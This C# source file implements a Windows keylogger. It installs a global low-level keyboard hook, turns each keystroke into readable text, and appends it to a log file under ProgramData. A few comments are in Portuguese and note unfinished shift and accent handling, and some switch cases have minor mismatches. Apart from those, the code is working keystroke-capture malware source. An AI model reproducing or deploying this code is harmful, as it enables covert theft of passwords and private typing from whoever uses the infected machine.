using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace vrtx_keys {
    class KeyBoardListener {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static int WM_KEYUP = 0x0101;
        private static int HC_ACTION = 0;
        private static int VK_SHIFT = 0x10;
        private static int VK_CAPITAL = 0x14;

        public static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static bool capsPressed = GetKeyState(VK_CAPITAL);
        private static bool shiftPressed = GetKeyState(VK_SHIFT);
        private static string FILEPATH = @"C:\ProgramData\mylog.txt";

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if(nCode >= HC_ACTION) {
                int vkCode = Marshal.ReadInt32(lParam);

                if(wParam == (IntPtr)WM_KEYDOWN) {
                    if(vkCode == VK_CAPITAL)
                        capsPressed = !capsPressed;

                    writeChar(vkCode);
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc) {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        private static void writeChar(int vkCode) {
            using(StreamWriter output = File.AppendText(FILEPATH)) {
                switch(((Keys)vkCode).ToString()) {
                    case "F1":
                    case "F2":
                    case "F3":
                    case "F4":
                    case "F5":
                    case "F6":
                    case "F7":
                    case "F8":
                    case "F9":
                    case "F10":
                    case "F11":
                    case "F12":
                        Console.Out.Write("{" + (Keys)vkCode + "}");
                        output.Write("{" + (Keys)vkCode + "}");
                        break;

                    //tratar shift
                    case "D1":
                    case "D2":
                    case "D3":
                    case "D4":
                    case "D5":
                    case "D6":
                    case "D7":
                    case "D8":
                    case "D9":
                    case "D0":
                        Console.Out.Write(((Keys)vkCode).ToString().Substring(1));
                        output.Write(((Keys)vkCode).ToString().Substring(1));
                        break;

                    //tratar shift e caps
                    case "Oem1":
                        Console.Out.Write("ç");
                        output.Write("ç");
                        break;

                    //tratar shift e altgr
                    case "Oem5":
                        Console.Out.Write("]");
                        output.Write("]");
                        break;

                    //tratar shift e altgr
                    case "Oem6":
                        Console.Out.Write("[");
                        output.Write("[");
                        break;

                    //tratar shift e acentuação
                    case "Oem7":
                        Console.Out.Write("{WIP}");
                        output.Write("{WIP}");
                        break;

                    //tratar shift e acentuação
                    case "OemOpenBrackets":
                        Console.Out.Write("{WIP}");
                        output.Write("{WIP}");
                        break;

                    //tratar shift
                    case "OemBackslash":
                        Console.Out.Write("\\");
                        output.Write("\\");
                        break;

                    //tratar shift
                    case "OemQuestion":
                        Console.Out.Write(";");
                        output.Write(";");
                        break;

                    //tratar shift
                    case "Oemtilde":
                        Console.Out.Write("'");
                        output.Write("'");
                        break;

                    //tratar shift
                    case "OemMinus":
                        Console.Out.Write("-");
                        output.Write("-");
                        break;

                    //tratar shift e altgr
                    case "Oemplus":
                        Console.Out.Write("=");
                        output.Write("=");
                        break;

                    case "Home":
                        Console.Out.Write("{HOME}");
                        output.Write("{HOME}");
                        break;

                    case "End":
                        Console.Out.Write("{END}");
                        output.Write("{END}");
                        break;

                    case "PageUp":
                        Console.Out.Write("{PGUP}");
                        output.Write("{PGUP}");
                        break;

                    //nao tenho ctz mas acho que esse é o pagedown
                    case "Next":
                        Console.Out.Write("{PGDOWN}");
                        output.Write("{PGDOWN}");
                        break;

                    case "VolumeMute":
                        Console.Out.Write("{VOLMUTE}");
                        output.Write("{VOLMUTE}");
                        break;

                    case "VolumeUp":
                        Console.Out.Write("{VOLUP}");
                        output.Write("{VOLUP}");
                        break;

                    case "VolumeDown":
                        Console.Out.Write("{VOLDOWN}");
                        output.Write("{VOLDOWN}");
                        break;


                    case "MediaPreviousTrack":
                        Console.Out.Write("{MPREVTRACK}");
                        output.Write("{MPREVTRACK}");
                        break;

                    case "MediaPlayPause":
                        Console.Out.Write("{MPLAYTRACK}");
                        output.Write("{MPREVTRACK}");
                        break; 

                    case "MediaNextTrack":
                        Console.Out.Write("{MNEXTRACK}");
                        output.Write("{MNEXTRACK}");
                        break;

                    case "BrowserSearch":
                        Console.Out.Write("{BRWRSEARCH}");
                        output.Write("{BRWRSEARCH}");
                        break;

                    case "LButton, OemClear":
                        Console.Out.Write("{BRIGHT_CONEC}");
                        output.Write("{BRIGHT_CONEC}");
                        break;
                        
                    case "Back":
                        Console.Out.Write("{BCKSP}");
                        output.Write("BCKSP");
                        break;

                    case "Capital":
                        Console.Out.Write("{CAPS}");
                        output.Write("{CAPS}");
                        break;

                    case "LShiftKey":
                        Console.Out.Write("{LSHIFT}");
                        output.Write("{LSHIFT}");
                        break;

                    case "RShiftKey":
                        Console.Out.Write("{RSHIFT}");
                        output.Write("{RSHIFT}");
                        break;

                    case "LControlKey":
                        Console.Out.Write("{LCONTROL}");
                        output.Write("{LCONTROL}");
                        break;

                    case "RControlKey":
                        Console.Out.Write("{RCONTROL}");
                        output.Write("{RCONTROL}");
                        break;

                    case "LWin":
                        Console.Out.Write("{LWIN}");
                        output.Write("{LWIN}");
                        break;

                    case "left":
                        Console.Out.Write("{ALEFT}");
                        output.Write("{ALEFT}");
                        break;

                    case "right":
                        Console.Out.Write("{ARIGHT}");
                        output.Write("{ARIGHT}");
                        break;

                    case "up":
                        Console.Out.Write("{AUP}");
                        output.Write("{AUP}");
                        break;

                    case "down":
                        Console.Out.Write("{ADOWN}");
                        output.Write("{ADOWN}");
                        break;

                    case "Escape":
                        Console.Out.Write("{ESC}");
                        output.Write("{ESC}");
                        break;

                    case "PrintScreen":
                        Console.Out.Write("{PRTSCR}");
                        output.Write("{PRTSCR}");
                        break;

                    case "Insert":
                        Console.Out.Write("{INS}");
                        output.Write("{INS}");
                        break;

                    case "Delete":
                        Console.Out.Write("{DEL}");
                        output.Write("{DEL}");
                        break;

                    //tratar shift e altgr
                    case "LButton, Oemtilde":
                        Console.Out.Write("/");
                        output.Write("/");
                        break;

                    //tratar shift e altgr
                    case "Oemcomma":
                        Console.Out.Write(",");
                        output.Write(",");
                        break;

                    //tratar shift e altgr
                    case "OemPeriod":
                        Console.Out.Write(".");
                        output.Write(".");
                        break;

                    case "Return":
                        Console.Out.Write("\n");
                        output.Write("\n");
                        break;

                    case "Space":
                        Console.Out.Write(" ");
                        output.Write(" ");
                        break;

                    case "Tab":
                        Console.Out.Write("{TAB}");
                        output.Write("{TAB}");
                        break;

                    default:
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed ^ capsPressed) {
                            Console.Out.Write((Keys)vkCode);
                            output.Write((Keys)vkCode);
                        }
                        else {
                            Console.Out.Write(((Keys)vkCode).ToString().ToLower());
                            output.Write(((Keys)vkCode).ToString().ToLower());
                        }
                    break;
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern bool GetKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}